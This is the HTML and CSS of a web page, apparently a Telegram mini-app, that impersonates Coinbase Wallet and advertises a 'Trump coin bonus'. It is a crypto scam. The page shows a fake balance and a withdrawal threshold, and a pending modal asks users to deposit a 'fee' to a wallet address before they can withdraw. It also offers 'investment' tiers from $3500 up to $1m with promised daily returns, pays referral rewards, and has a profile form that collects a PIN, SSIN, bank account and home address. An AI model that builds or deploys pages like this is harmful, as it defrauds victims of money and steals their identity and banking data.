<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Coinbase Wallet</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.7.2/css/all.css">
  <link href="https://unpkg.com/boxicons@2.0.7/css/boxicons.min.css" rel="stylesheet">
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast@1.4.0/dist/css/iziToast.min.css">
  <script src="https://cdn.jsdelivr.net/npm/izitoast@1.4.0/dist/js/iziToast.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.12.0/toastify.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.12.0/toastify.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/izimodal/1.6.0/css/iziModal.min.css">
  <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>

  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: 'Inter', sans-serif;
      user-select: none;
      transition: background-color 0.3s ease;
    }
    #coinbase_hd {
      width: 35px;
      height: 35px;
      margin: 0;
      padding: 0;
      background-color: #fff;
      border-radius: 50%;
    }
    .wallet-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px;
      background-color: #111;
    }
    .wallet-header h1 {
      font-size: 1rem;
      margin: 0;
    }
    .account-section {
      display: flex;
      align-items: center;
      overflow: hidden;
      white-space: nowrap;
      text-overflow: ellipsis;
      max-width: 150px;
      cursor: pointer;
    }
    .account-section span {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }
    .dropdown-menu {
      background-color: #222;
      border: none;
      border-radius: 10px;
      overflow: hidden;
    }
    .dropdown-item {
      color: #fff;
      transition: all 0.3s;
    }
    .dropdown-item:active {
      background-color: gold;
      color: #000;
    }
    .balance-section {
      text-align: center;
      margin: 20px 0;
    }
    .balance-section h2 {
      font-size: 2.5rem;
      margin: 10px 0;
      font-weight: 900;
    }
    .coin-default {
      border-radius: 16px;
      padding: 2px 8px;
      background-color: #808080a6;
      font-size: 10px;
      color: #bfbfbfae;
      margin: 0;
      position: relative;
      top: -2.5px;
      font-weight: 900;
      opacity: 0.7;
    }
    .btn-circle {
      width: 55px;
      height: 55px;
      border-radius: 50%;
      border: none;
      background-color: #222;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 1.2rem;
      margin: 10px;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    .btn-circle:hover {
      background-color: gold;
      color: #222;
      transform: scale(1.05);
    }
    .action-buttons {
      display: flex;
      justify-content: center;
      gap: 10px;
    }
    @media only screen and (max-width: 450px) {
      .action-buttons {
        justify-content: center;
        gap: 2px;
      }
      .btn-circle {
        width: 45px;
        height: 45px;
      }
    }
    .action-item {
      text-align: center;
    }
    .action-item span {
      display: block;
      margin-top: 5px;
      font-size: 0.8rem;
    }
    .crypto-card {
      background-color: #222;
      border-radius: 20px;
      padding: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 10px 0;
    }
    .crypto-card img {
      width: 40px;
      height: 40px;
    }
    .crypto-card .details {
      flex-grow: 1;
      margin-left: 15px;
    }
    .crypto-card .details h5 {
      margin: 0;
    }
    .crypto-card .price {
      text-align: right;
    }
    .crypto-card .price span {
      font-size: 0.9rem;
      color: #999;
    }
    .green { color: green; }
    .red { color: red; }
    .dark-content {
      background-color: #222;
      color: #fff;
      padding: 20px;
      border-radius: 8px;
      font-size: 1rem;
    }
    .dark-content button {
      background-color: #444;
      color: #fff;
      border: none;
      padding: 10px 20px;
      margin-top: 15px;
      border-radius: 4px;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    .dark-content button:hover {
      background-color: #666;
      transform: scale(1.05);
    }
    .iziModal {
      width: 90%;
      max-width: 600px;
      border-radius: 12px;
      transition: transform 0.3s ease, opacity 0.3s ease;
    }
    @media (min-width: 576px) {
      .iziModal {
        width: 80%;
      }
    }
    .wallet-form {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      margin-bottom: 20px;
    }
    .wallet-form input[type="text"],
    .wallet-form input[type="email"],
    .wallet-form input[type="number"],
    .wallet-form input[type="password"],
    .form-select {
      width: 90%;
      max-width: 400px;
      padding: 10px;
      border: none;
      border-radius: 8px;
      background-color: #333;
      color: #fff;
      font-size: 0.9rem;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
      transition: box-shadow 0.3s ease;
    }
    .wallet-form input::placeholder {
      color: #aaa;
    }
    .wallet-form input:focus,
    .form-select:focus {
      outline: none;
      box-shadow: 0 0 8px rgba(15, 124, 219, 0.5);
    }
    .wallet-form input[type="submit"] {
      padding: 10px 20px;
      background-color: #444;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 0.9rem;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    .wallet-form input[type="submit"]:hover {
      background-color: #666;
      transform: scale(1.05);
    }
    .wallet-form input[type="submit"].loading {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }
    .depAddr {
      font-weight: bold;
      color: #0f7cdb;
      background: #333;
      padding: 5px 10px;
      border-radius: 6px;
      font-size: 0.9rem;
      letter-spacing: 0.5px;
    }
    #copyIt, #copyAddress {
      margin-left: 10px;
      cursor: pointer;
      color: #fff;
      font-size: 1.1rem;
      transition: color 0.3s ease;
    }
    #copyIt:hover, #copyAddress:hover {
      color: #0f7cdb;
    }
    .close-btn {
      margin-top: 15px;
      padding: 10px 20px;
      background-color: #444;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 0.9rem;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    .close-btn:hover {
      background-color: #666;
      transform: scale(1.05);
    }
    .hidden-label {
      position: absolute;
      left: -9999px;
    }
    .coin-defaults {
      background-image: linear-gradient(45deg, gold, yellow, white, gray);
      background-size: 200% auto;
      color: transparent;
      -webkit-background-clip: text;
      animation: gradientAnimation 2s linear infinite;
    }
    @keyframes gradientAnimation {
      to {
        background-position: -200% center;
      }
    }
    .trump_img {
      border-radius: 50%;
      width: 50px;
      height: 50px;
    }
    .warning {
      color: red;
      font-weight: 100;
      font-size: 0.7rem;
    }
    .hide {
      display: none;
    }
    #qrCodeContainer canvas {
      padding: 15px;
      background-color: #fff;
      border-radius: 5px;
    }
    .visually-hidden {
      position: absolute;
      width: 1px;
      height: 1px;
      padding: 0;
      margin: -1px;
      overflow: hidden;
      clip: rect(0, 0, 0, 0);
      border: 0;
    }
    .form-select {
      padding: 10px;
      border-radius: 8px;
      border: none;
      background-color: #333;
      color: #fff;
      margin-bottom: 10px;
      font-size: 0.9rem;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
    }
    #notification-table-body li {
      padding: 10px;
      border-bottom: 1px solid #444;
      font-size: 0.9rem;
    }
    #notification-table-body li:last-child {
      border-bottom: none;
    }
    body.light {
      background-color: #f8f9fa;
      color: #333;
    }
    body.light .wallet-header,
    body.light .crypto-card,
    body.light .dark-content {
      background-color: #fff;
      color: #333;
    }
    body.light .dropdown-menu {
      background-color: #fff;
      color: #333;
    }
    body.light .dropdown-item {
      color: #333;
    }
    body.light .btn-circle {
      background-color: #ddd;
      color: #333;
    }
    body.light .form-select,
    body.light .wallet-form input {
      background-color: #fff;
      color: #333;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }
    body.light .table-dark {
      background-color: #fff;
      color: #333;
    }
    .wallet-cell {
      display: flex;
      align-items: center;
      gap: 5px;
    }
    .btn-copy {
      background-color: #28a745;
      color: #fff;
      border: none;
      padding: 6px 10px;
      border-radius: 6px;
      font-size: 0.85rem;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    .btn-copy:hover {
      background-color: #218838;
      transform: scale(1.05);
    }
    .investment-options {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      justify-content: center;
    }
    .investment-btn {
      background-color: #444;
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 0.9rem;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    .investment-btn:hover {
      background-color: #666;
      transform: scale(1.05);
    }
    .investment-btn:disabled {
      background-color: #333;
      cursor: not-allowed;
      opacity: 0.6;
    }
    .countdown-container {
      margin-top: 15px;
      text-align: center;
    }
    .countdown-timer {
      font-size: 1.2rem;
      font-weight: bold;
      color: gold;
    }
    .switch {
      position: relative;
      display: inline-block;
      width: 50px;
      height: 24px;
    }
    .switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }
    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: 0.4s;
      border-radius: 24px;
    }
    .slider:before {
      position: absolute;
      content: "";
      height: 20px;
      width: 20px;
      left: 2px;
      bottom: 2px;
      background-color: white;
      transition: 0.4s;
      border-radius: 50%;
    }
    input:checked + .slider {
      background-color: #0f7cdb;
    }
    input:checked + .slider:before {
      transform: translateX(26px);
    }
    .chat-messages {
      max-height: 300px;
      overflow-y: auto;
      margin-bottom: 10px;
      padding: 10px;
      background: #222;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
    }
    .chat-date-header {
      text-align: center;
      font-size: 0.75rem;
      color: #999;
      margin: 10px 0;
      font-weight: 500;
      background: #333;
      padding: 4px 8px;
      border-radius: 12px;
      display: inline-block;
      width: auto;
      align-self: center;
    }
    .chat-message {
      margin: 6px 0;
      padding: 8px 12px;
      border-radius: 12px;
      max-width: 75%;
      word-wrap: break-word;
      position: relative;
      animation: slideIn 0.3s ease;
      display: flex;
      align-items: flex-start;
      gap: 8px;
      font-size: 0.9rem;
    }
    .chat-message.user {
      background: #0f7cdb;
      color: #fff;
      margin-left: auto;
      text-align: left;
      border-bottom-right-radius: 4px;
      flex-direction: column;
    }
    .chat-message.support {
      background: #333;
      color: #fff;
      margin-right: auto;
      text-align: left;
      border-bottom-left-radius: 4px;
    }
    .chat-message .message-footer {
      display: flex;
      justify-content: flex-end;
      align-items: center;
      gap: 6px;
      margin-top: 4px;
    }
    .chat-message small {
      font-size: 0.65rem;
      color: #ccc;
    }
    .chat-message .status {
      font-size: 0.7rem;
      color: #ccc;
    }
    .chat-message .status.pending i::before {
      content: "\f00c";
    }
    .chat-message .status.sent i::before {
      content: "\f560";
    }
    .avatar {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background: #0f7cdb;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.9rem;
      font-weight: bold;
      margin-right: 6px;
      flex-shrink: 0;
      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
    }
    .chat-message.support .avatar {
      background: #555;
      font-size: 0.8rem;
    }
    .chat-message.support .avatar i {
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .chat-input {
      display: flex;
      gap: 8px;
      align-items: center;
      background: #222;
      padding: 8px;
      border-radius: 12px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
    }
    .chat-input input {
      flex: 1;
      padding: 8px;
      border: none;
      border-radius: 8px;
      background: #333;
      color: #fff;
      font-size: 0.85rem;
      height: 34px;
      line-height: 1.5;
      transition: box-shadow 0.3s ease;
    }
    .chat-input input:focus {
      outline: none;
      box-shadow: 0 0 8px rgba(15, 124, 219, 0.5);
    }
    .chat-input button {
      padding: 0 12px;
      background: #0f7cdb;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 0.85rem;
      height: 34px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    .chat-input button:hover {
      background: #0b5ea3;
      transform: scale(1.05);
    }
    .typing-indicator {
      display: flex;
      align-items: center;
      gap: 5px;
      padding: 8px;
      background: #333;
      border-radius: 12px;
      margin: 6px 0;
      max-width: 75%;
    }
    .typing-indicator span {
      width: 6px;
      height: 6px;
      background: #0f7cdb;
      border-radius: 50%;
      animation: bounce 0.6s infinite alternate;
    }
    .typing-indicator span:nth-child(2) {
      animation-delay: 0.2s;
    }
    .typing-indicator span:nth-child(3) {
      animation-delay: 0.4s;
    }
    @keyframes bounce {
      to {
        transform: translateY(-4px);
      }
    }
    .support-status {
      font-size: 0.8rem;
      color: #ccc;
      margin-bottom: 10px;
      text-align: center;
    }
    .iziModal {
      animation: slideInModal 0.3s ease;
    }
    @keyframes slideInModal {
      from {
        transform: translateY(50px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }
    @keyframes slideIn {
      from {
        transform: translateY(10px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }
    @media (max-width: 576px) {
      .iziModal {
        width: 95%;
      }
      .dark-content {
        font-size: 0.85rem;
        padding: 15px;
      }
      .wallet-form input,
      .form-select,
      .investment-btn {
        font-size: 0.8rem;
        padding: 8px;
      }
      .close-btn {
        font-size: 0.8rem;
        padding: 8px 15px;
      }
      .depAddr {
        font-size: 0.8rem;
      }
      .btn-copy {
        font-size: 0.75rem;
        padding: 4px 8px;
      }
      .countdown-timer {
        font-size: 1rem;
      }
      #copyIt, #copyAddress {
        font-size: 1rem;
      }
      .table {
        font-size: 0.8rem;
        display: block;
        overflow-x: auto;
        white-space: nowrap;
      }
      .table thead th {
        min-width: 80px;
        padding: 6px;
      }
      .table tbody td {
        min-width: 80px;
        padding: 6px;
      }
      .chat-messages {
        max-height: 250px;
        padding: 8px;
        margin-bottom: 8px;
      }
      .chat-message {
        font-size: 0.8rem;
        padding: 6px 10px;
        margin: 4px 0;
      }
      .chat-message .message-footer {
        gap: 4px;
      }
      .chat-message small {
        font-size: 0.6rem;
      }
      .chat-message .status {
        font-size: 0.65rem;
      }
      .avatar {
        width: 20px;
        height: 20px;
        font-size: 0.8rem;
      }
      .chat-message.support .avatar {
        font-size: 0.7rem;
      }
      .chat-input {
        padding: 6px;
        gap: 6px;
      }
      .chat-input input {
        font-size: 0.8rem;
        padding: 6px;
        height: 30px;
      }
      .chat-input button {
        font-size: 0.8rem;
        padding: 0 10px;
        height: 30px;
      }
      .typing-indicator {
        padding: 6px;
      }
      .typing-indicator span {
        width: 5px;
        height: 5px;
      }
      .support-status {
        font-size: 0.75rem;
      }
      .chat-date-header {
        font-size: 0.7rem;
        padding: 3px 6px;
      }
    }
  </style>
</head>
<body>
  <!-- Wallet Header -->
  <div class="wallet-header">
    <img id="coinbase_hd" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDAaw4l8JGDm5-GkzwJuNd9m7vsxf9-5ZtXeN-akM1A82LJq7Re5MOYa0v-3xKpUd4NdM&usqp=CAU" alt="Coinbase">
    <h1>Coinbase Wallet</h1>
    <div class="dropdown">
      <div class="account-section dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false">
        <span id="account-name">Account</span>
      </div>
      <ul class="dropdown-menu">
        <li><a class="dropdown-item open-btn" id="profile-pop" data-modal-id="profile-iziModal">Profile</a></li>
        <li><a class="dropdown-item open-btn" id="history-pop" data-modal-id="history-iziModal">History</a></li>
        <li><a class="dropdown-item open-btn" id="notification-pop" data-modal-id="notification-iziModal">Notification</a></li>
        <li><a class="dropdown-item open-btn" id="settings-pop" data-modal-id="settings-iziModal">Settings</a></li>
        <li><a class="dropdown-item open-btn" id="chat-pop" data-modal-id="chat-iziModal">Chat Support</a></li>
        <li><a class="dropdown-item open-btn" id="logout-pop" data-modal-id="logout-iziModal">Logout</a></li>
      </ul>
    </div>
  </div>

  <!-- Balance Section -->
  <div class="balance-section">
    <h2 id="balance-display"><!-- $78.01/$25.01 --> <i class="fas fa-spin-pulse fa-spinner"></i></h2>
    <p>
      <span id="wallet-address" data-wallet="0xA1Ed1234567890abcdef1234567890abcdef1234">0xA1Ed...f1234</span>
      <i id="copyAddress" class="bx bx-copy" title="Copy full address"></i>
      <span class="coin-default"><span class="coin-defaults">Trump</span></span>
    </p>
  </div>

  <!-- Action Buttons -->
  <div class="action-buttons">
    <div class="action-item">
      <button class="btn-circle open-btn" data-modal-id="darkModal1"><i class="far fa-arrow-up-right"></i></button>
      <span>Send</span>
    </div>
    <div class="action-item">
      <button class="btn-circle open-btn" data-modal-id="darkModal7"><i class="far fa-arrow-alt-circle-up"></i></button>
      <span>Withdraw</span>
    </div>
    <div class="action-item">
      <button class="btn-circle open-btn" data-modal-id="darkModal3"><i class="fa-regular fa-gift"></i></button>
      <span>Hot ðŸ”¥</span>
    </div>
    <div class="action-item">
      <button class="btn-circle open-btn" data-modal-id="darkModal4"><i class="fa-regular fa-layer-plus"></i></button>
      <span>Tasks</span>
    </div>
    <div class="action-item">
      <button class="btn-circle open-btn" id="share-button" data-modal-id="darkModal5"><i class="fa-regular fa-share-nodes"></i></button>
      <span>Share</span>
    </div>
  </div>

  <!-- Crypto Cards -->
  <div class="container">
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/bnb-binance-coin/logo.png" alt="BNB">
      <div class="details">
        <h5>BNB</h5>
        <span>BNB Smart Chain</span>
      </div>
      <div class="price">
        <p>$76.01</p>
        <span>691.03 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/eth-ethereum/logo.png" alt="ETH">
      <div class="details">
        <h5>ETH</h5>
        <span>Ethereum</span>
      </div>
      <div class="price">
        <p>$2.10</p>
        <span>3230.83 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/shib-shiba-inu/logo.png" alt="SHIBA">
      <div class="details">
        <h5>SHIBA</h5>
        <span>Ethereum</span>
      </div>
      <div class="price">
        <p>$1.51</p>
        <span>234.04 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/usdt-tether/logo.png" alt="USDT">
      <div class="details">
        <h5>USDT</h5>
        <span>BNB Smart Chain</span>
      </div>
      <div class="price">
        <p>$1.00</p>
        <span>1.00 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/pepe-pepe/logo.png" alt="PEPE">
      <div class="details">
        <h5>PEPE</h5>
        <span>Ethereum Chain</span>
      </div>
      <div class="price">
        <p>$0.00000123</p>
        <span>0.0000003 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/sui-sui/logo.png" alt="SUI">
      <div class="details">
        <h5>SUI</h5>
        <span>Sui Blockchain</span>
      </div>
      <div class="price">
        <p>$0.98</p>
        <span>1.02 $</span>
      </div>
    </div>
    <div class="crypto-card">
      <img src="https://static.coinpaprika.com/coin/link-chainlink/logo.png" alt="LINK">
      <div class="details">
        <h5>LINK</h5>
        <span>Ethereum Chain</span>
      </div>
      <div class="price">
        <p>$7.14</p>
        <span>7.01 $</span>
      </div>
    </div>
  </div>

  <!-- Dark Popup Modal 1 (Send) -->
  <div id="darkModal1" class="iziModal" data-izimodal-title="Send">
    <div class="dark-content">
      <p>Enter recipient details</p>
      <form class="wallet-form" id="send-form">
        <label for="sendWalletInput" class="hidden-label">Recipient Wallet Address</label>
        <input type="text" id="sendWalletInput" placeholder="Enter Recipient Wallet Address..." required>
        <span class="text-warning warning">Please verify that the wallet address is valid before sending to prevent loss of funds.</span>
        <label for="sendAmountInput" class="hidden-label">Send Amount</label>
        <input type="number" id="sendAmountInput" placeholder="Enter Amount" step="0.01" min="0.01" required>
        <span class="text-warning warning hide" id="insufficient-send-balance">* You do not have sufficient balance!</span>
        <input id="submitSendInfo" type="submit" value="Send">
      </form>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 2 (Eligibility Message) -->
  <div id="darkModal2" class="iziModal" data-izimodal-title="Withdraw">
    <div class="dark-content">
      <p id="withdraw-message">You need a minimum balance of $70.01 to withdraw.</p>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 3 -->
  <div id="darkModal3" class="iziModal" data-izimodal-title="Hot ðŸ”¥">
    <div class="dark-content">
      <p>Congratulation!</p>
      <p>You've joined the Trump coin bonus. Kindly complete the tasks to reach the withdrawal threshold.</p>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 4 (Tasks) -->
  <div id="darkModal4" class="iziModal" data-izimodal-title="Tasks">
    <div class="dark-content">
      <p style="text-align: left;">
        <span>Instructions & Rules:</span>
        <ol type="i" style="text-align:left;">
          <li>Complete daily trades to increase your balance and unlock withdrawals.</li>
          <li>Ensure your profile details are complete and accurate to avoid delays in withdrawal processing.</li>
          <li>Monitor your transaction history to track deposits, withdrawals, and earnings.</li>
        </ol>
      </p>
      <p style="text-align: left;">
        <span>Trade & Invest:</span>
        <p>Select an investment amount to start trading and earn daily returns:</p>
        <div class="investment-options">
          <button class="investment-btn" data-amount="3500">$3500</button>
          <button class="investment-btn" data-amount="5000">$5000</button>
          <button class="investment-btn" data-amount="10000">$10000</button>
          <button class="investment-btn" data-amount="20000">$20000</button>
          <button class="investment-btn" data-amount="30000">$30000</button>
          <button class="investment-btn" data-amount="50000">$50k - $1m</button>
        </div>
        <div id="investment-status" style="margin-top: 15px;"></div>
        <div class="countdown-container">
          <p>Next claim available in: <span id="countdown-timer" class="countdown-timer">24:00:00</span></p>
          <button id="claim-reward" class="investment-btn" disabled>Claim Reward</button>
        </div>
      </p>
      <p style="text-align: left;">
        <span>Guides:</span>
        <ul style="text-align:left;">
          <li>Monitor your referral count in the Profile section to track your progress.</li>
          <li>Check the Transaction History regularly to confirm deposits, withdrawals, and fees.</li>
          <li>Contact support via the Chat option in Settings for issues with payments or account verification.</li>
        </ul>
      </p>
      <p>For support or inquiries:</p>
      <button class="close-btn open-btn" data-modal-id="chat-iziModal">Contact Support</button>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 5 -->
  <div id="darkModal5" class="iziModal" data-izimodal-title="Share">
    <div class="dark-content">
      <p>Your referral link has been copied successfully!</p>
      <p>Share the link to get $10 per referral!</p>
      <p><strong style="color:red;">Note:</strong> Your withdrawal is subject to review and verification.</p>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 6 -->
  <div id="darkModal6" class="iziModal" data-izimodal-title="Update!!!">
    <div class="dark-content">
      <p><img class="trump_img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png" alt="Trump"></p>
      <p><strong>Don't miss out</strong> on your special offer for this season. The live OFFICIAL TRUMP today is amazing with a 24-hour trading volume of $4430844387.08 USD. Be among the lucky winners now by completing the tasks.</p>
      <p>Share the link and contact support via Chat for more details!</p>
      <p><strong><a style="color:green;" href="https://coinmarketcap.com/currencies/official-trump/">Read More Â»</a></strong></p>
      <p><strong><button class="close-btn open-btn" data-modal-id="chat-iziModal">Contact Support</button></strong></p>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 7 (Withdraw Form) -->
  <div id="darkModal7" class="iziModal" data-izimodal-title="Withdraw">
    <div class="dark-content">
      <p>Enter your withdrawal details</p>
      <form class="wallet-form" id="wallet-form">
        <label for="walletInput" class="hidden-label">Wallet Address</label>
        <input type="text" id="walletInput" placeholder="Enter Recipient Wallet Address..." required>
        <span class="text-warning warning">Please verify that the wallet address is correct before withdrawing to prevent loss of funds.</span>
        <label for="wallet_amountInput" class="hidden-label">Withdrawal Amount</label>
        <input type="number" id="wallet_amountInput" placeholder="Enter Amount" step="0.01" min="0.01" required>
        <span class="text-warning warning hide" id="insufficient-balance">* You do not have sufficient balance!</span>
        <label for="walletNetwork" class="hidden-label">Network</label>
        <select id="walletNetwork" class="form-select" required>
          <option value="ERC20">ERC20 (USDT/ETH)</option>
          <option value="Bitcoin">Bitcoin (BTC)</option>
        </select>
        <input id="submitWalletInfo" type="submit" value="Withdraw">
      </form>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 8 -->
  <div id="darkModal8" class="iziModal" data-izimodal-title="Pending">
    <div class="dark-content">
      <p>Payment!!!</p>
      <p>Kindly copy the wallet address below and make a deposit of <span id="fee-amount">0.00</span> <span id="fee-currency">USD</span>.</p>
      <p>
        <span class="depAddr" id="fee-wallet"></span>
        <i class="far fa-copy" id="copyIt" title="Copy Address"></i>
      </p>
      <div id="qrCodeContainer" style="margin-top: 15px;"></div>
      <p style="font-size:0.7rem;"><span style="color:red;">NOTE:</span> * Do not click continue if you have not made payment! Clicking continue without payment will incur permanent fund loss.</p>
      <p id="continuePayment"><strong id="continuePaymentText">Continue Â»</strong></p>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Dark Popup Modal 9 -->
  <div id="darkModal9" class="iziModal" data-izimodal-title="Status - <strong>Pending</strong>">
    <div class="dark-content">
      <p><img class="trump_img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png" alt="Trump"></p>
      <p><strong>Congratulations!!! ðŸŽ‰ðŸŽ‰ðŸŽ‰</strong></p>
      <p>You have already requested a withdrawal! Kindly wait for confirmation of your payment. Your withdrawal will be automatically settled in your specified <span class="coin-defaults">TRUMP</span> wallet after verification.</p>
      <p><h4>Want to earn more?</h4></p>
      <p>Contact support via Chat for more details!</p>
      <p><strong><button class="close-btn open-btn" data-modal-id="chat-iziModal">Contact Support</button></strong></p>
      <p style="font-style:italic; font-weight:100;">Thanks for your participation</p>
      <button class="close-btn" id="continuePaymentCls">Close</button>
    </div>
  </div>

  <!-- Profile iziModal -->
  <div id="profile-iziModal" class="iziModal" data-izimodal-title="<strong>Profile</strong>">
    <div class="dark-content">
      <p>Update your profile details:</p>
      <form id="profile-form" class="wallet-form">
        <label for="usernameInput" class="visually-hidden">Telegram Username</label>
        <input type="text" id="usernameInput" placeholder="Telegram Username" disabled>
        <label for="fullNameInput" class="visually-hidden">Full Name</label>
        <input type="text" id="fullNameInput" placeholder="Enter Full Name" required>
        <label for="emailInput" class="visually-hidden">Email</label>
        <input type="email" id="emailInput" placeholder="Enter Email (optional)">
        <label for="pinInput" class="visually-hidden">PIN</label>
        <input type="password" id="pinInput" placeholder="Enter 4 or 6-digit PIN" pattern="[0-9]{4}|[0-9]{6}" required>
        <label for="ssinInput" class="visually-hidden">SSIN</label>
        <input type="text" id="ssinInput" placeholder="Enter SSIN (optional)">
        <label for="accountNumberInput" class="visually-hidden">Account Number</label>
        <input type="text" id="accountNumberInput" placeholder="Enter Account Number (optional)">
        <label for="bankNameInput" class="visually-hidden">Bank Name</label>
        <input type="text" id="bankNameInput" placeholder="Enter Bank Name (optional)">
        <label for="addressInput" class="visually-hidden">Full Address</label>
        <input type="text" id="addressInput" placeholder="Enter Full Address (optional)">
        <input type="submit" id="submitProfileInfo" value="Save">
      </form>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Settings iziModal -->
  <div id="settings-iziModal" class="iziModal" data-izimodal-title="<strong>Settings</strong>">
    <div class="dark-content">
      <p>Customize your preferences:</p>
      <form id="settings-form" class="wallet-form">
        <label for="themeSelect" class="visually-hidden">Theme</label>
        <select id="themeSelect" class="form-select">
          <option value="dark">Dark</option>
          <option value="light">Light</option>
        </select>
        <label for="currencySelect" class="visually-hidden">Currency</label>
        <select id="currencySelect" class="form-select">
          <option value="USD">USD</option>
          <option value="USDT">USDT</option>
          <option value="BTC">BTC</option>
          <option value="ETH">ETH</option>
        </select>
        <label for="networkSelect" class="visually-hidden">Network</label>
        <select id="networkSelect" class="form-select">
          <option value="ERC20">ERC20 (USDT/ETH)</option>
          <option value="Bitcoin">Bitcoin (BTC)</option>
        </select>
        <label for="autoRenew" class="visually-hidden">Auto-Renew Investment</label>
        <div style="display: flex; align-items: center; gap: 10px;">
          <span>Auto-Renew Investment</span>
          <label class="switch">
            <input type="checkbox" id="autoRenew">
            <span class="slider"></span>
          </label>
        </div>
        <input type="submit" id="submitSettingsInfo" value="Save">
      </form>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Notification iziModal -->
  <div id="notification-iziModal" class="iziModal" data-izimodal-title="<strong>Notifications</strong>">
    <div class="dark-content">
      <p>Your notifications:</p>
      <div id="notification-list">
        <ul id="notification-table-body" style="list-style: none; padding: 0;"></ul>
      </div>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- History iziModal -->
  <div id="history-iziModal" class="iziModal" data-izimodal-title="<strong>Transaction History</strong>">
    <div class="dark-content">
      <p>Your transaction history:</p>
      <div id="transaction-list">
        <table class="table table-dark">
          <thead>
            <tr>
              <th>Amount</th>
              <th>Currency</th>
              <th>Wallet</th>
              <th>Network</th>
              <th>Type</th>
              <th>Status</th>
              <th>Date</th>
            </tr>
          </thead>
          <tbody id="transaction-table-body"></tbody>
        </table>
      </div>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Chat iziModal -->
  <div id="chat-iziModal" class="iziModal" data-izimodal-title="<strong>Chat Support</strong>">
    <div class="dark-content">
      <p class="support-status" id="support-status">Support is online</p>
      <div class="chat-messages" id="chat-messages">
        <p class="chat-message support">Start chatting with our support team...</p>
      </div>
      <div class="chat-input">
        <input type="text" id="chat-input" placeholder="Type your message...">
        <button class="btn" id="send-message"><i class="fas fa-paper-plane"></i></button>
      </div>
      <button class="close-btn">Close</button>
    </div>
  </div>

  <!-- Logout iziModal -->
